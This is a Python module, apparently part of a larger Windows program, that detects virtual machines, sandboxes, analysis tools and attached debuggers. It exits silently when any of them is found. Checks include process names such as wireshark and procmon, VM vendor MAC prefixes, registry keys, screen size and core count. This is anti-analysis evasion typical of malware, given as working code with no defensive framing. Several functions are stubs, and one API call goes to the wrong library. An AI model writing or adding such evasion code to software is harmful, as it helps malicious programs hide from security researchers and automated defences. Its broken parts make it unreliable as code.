# core/antivm.py
import os
import sys
import ctypes
import platform
import subprocess
from typing import Tuple

class AntiVM:
    """Virtual Machine and sandbox detection"""
    
    @staticmethod
    def check_processes() -> bool:
        """Check for known VM/sandbox processes"""
        suspicious = [
            'vmtoolsd', 'vmwaretray', 'vboxservice', 'vboxtray', 
            'xenservice', 'vmsrvc', 'procmon', 'procexp', 
            'wireshark', 'fiddler', 'burpsuite', 'pythonw.exe'
        ]
        try:
            output = subprocess.run(['tasklist', '/FO', 'CSV'], capture_output=True, text=True, timeout=10)
            output_lower = output.stdout.lower()
            for proc in suspicious:
                if proc in output_lower:
                    return True
        except:
            pass
        return False
    
    @staticmethod
    def check_drives() -> bool:
        """Check for VM-specific drives"""
        try:
            drives = []
            if os.name == 'nt':
                import string
                from ctypes import windll
                drives_bitmask = windll.kernel32.GetLogicalDrives()
                for letter in string.ascii_uppercase:
                    if drives_bitmask & 1:
                        drives.append(f"{letter}:\\")
                    drives_bitmask >>= 1
            else:
                drives = ['/']
            # Check for small drive size or specific labels
            # This is simplified
            return False
        except:
            return False
    
    @staticmethod
    def check_mac_address() -> bool:
        """Check MAC address for known VM vendors"""
        vm_mac_prefixes = [
            '00:0C:29',  # VMware
            '00:50:56',  # VMware
            '00:05:69',  # VMware
            '08:00:27',  # VirtualBox
            '52:54:00',  # QEMU/KVM
            '00:15:5D',  # Hyper-V
            '00:0F:4B',  # Virtual Iron
        ]
        try:
            output = subprocess.run(['getmac', '/FO', 'CSV'], capture_output=True, text=True, timeout=10)
            for line in output.stdout.splitlines():
                for prefix in vm_mac_prefixes:
                    if prefix.lower() in line.lower():
                        return True
        except:
            pass
        return False
    
    @staticmethod
    def check_registry() -> bool:
        """Check registry for VM software"""
        vm_keys = [
            r"SOFTWARE\VMware, Inc.\VMware Tools",
            r"SOFTWARE\Oracle\VirtualBox",
            r"SYSTEM\ControlSet001\Services\VBoxGuest",
            r"SYSTEM\ControlSet001\Services\vmci",
        ]
        try:
            import winreg
            for key_path in vm_keys:
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ) as key:
                        return True
                except:
                    continue
        except:
            pass
        return False
    
    @staticmethod
    def check_screen_resolution() -> bool:
        """Check if screen resolution is too small (sandbox)"""
        try:
            from ctypes import windll, byref, c_int
            user32 = windll.user32
            width = user32.GetSystemMetrics(0)
            height = user32.GetSystemMetrics(1)
            # Most sandboxes use 800x600 or 1024x768
            if width < 1024 or height < 768:
                return True
        except:
            pass
        return False
    
    @staticmethod
    def check_cpu_cores() -> bool:
        """Check if CPU has low core count (sandbox)"""
        try:
            import multiprocessing
            cores = multiprocessing.cpu_count()
            if cores <= 2:
                return True
        except:
            pass
        return False
    
    @staticmethod
    def check_uptime() -> bool:
        """Check if system uptime is very low (fresh VM)"""
        try:
            import ctypes
            from ctypes import wintypes
            kernel32 = ctypes.windll.kernel32
            tick_count = kernel32.GetTickCount()
            uptime_minutes = tick_count / 60000
            # Less than 10 minutes uptime suggests sandbox
            if uptime_minutes < 10:
                return True
        except:
            pass
        return False
    
    @staticmethod
    def is_vm() -> Tuple[bool, str]:
        """Run all checks and return (is_vm, reason)"""
        checks = [
            (AntiVM.check_processes, "VM process detected"),
            (AntiVM.check_mac_address, "VM MAC address detected"),
            (AntiVM.check_registry, "VM registry key detected"),
            (AntiVM.check_screen_resolution, "Small screen resolution"),
            (AntiVM.check_cpu_cores, "Low CPU core count"),
        ]
        for check_func, reason in checks:
            if check_func():
                return (True, reason)
        return (False, "")

class AntiDebug:
    """Debugger detection"""
    
    @staticmethod
    def is_debugger_present() -> bool:
        """Check if debugger is attached using Windows API"""
        try:
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent():
                return True
        except:
            pass
        return False
    
    @staticmethod
    def check_remote_debugger() -> bool:
        """Check for remote debugger"""
        try:
            kernel32 = ctypes.windll.kernel32
            debug_port = ctypes.c_uint()
            kernel32.NtQueryInformationProcess(ctypes.windll.kernel32.GetCurrentProcess(), 7, ctypes.byref(debug_port), 4, None)
            if debug_port.value != 0:
                return True
        except:
            pass
        return False
    
    @staticmethod
    def check_breakpoints() -> bool:
        """Check for software breakpoints (int 3)"""
        # Simplified check
        # In real implementation, we'd check function prologues
        return False
    
    @staticmethod
    def is_debugged() -> bool:
        """Run all anti-debug checks"""
        checks = [
            AntiDebug.is_debugger_present,
            AntiDebug.check_remote_debugger,
        ]
        for check in checks:
            if check():
                return True
        return False

# Integration function to exit if running in VM/debugger
def exit_if_analyzed():
    """Exit the process if VM or debugger detected"""
    is_vm, reason = AntiVM.is_vm()
    if is_vm:
        sys.exit(0)
    if AntiDebug.is_debugged():
        sys.exit(0)
